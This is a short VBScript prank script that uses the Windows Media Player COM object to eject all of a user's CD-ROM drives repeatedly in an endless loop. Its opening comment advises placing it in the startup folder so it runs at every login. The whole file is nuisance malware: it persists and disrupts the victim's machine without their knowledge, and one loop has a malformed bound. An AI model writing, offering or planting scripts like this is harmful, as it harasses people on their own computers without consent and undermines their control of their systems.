'//Ejects the users CD-ROM (Add to startup directory folder for long term fun)
set oWMP = CreateObject("WMPlayer.OCX.7")
set colCDROMS = oWMP.cdromCollection
wscript.sleep 600000

Do 
if colCDRoms.Count >= 1 then 
For i = 0 to colCDROMs.Count -1 
	colCDROMs.Item(i).Eject 
Next 
For i = 0 to colCDROMs.Count = 1 
colCDROMs.Item(i).Eject
Next 
End If 
wscript.Sleep 120000
loop 


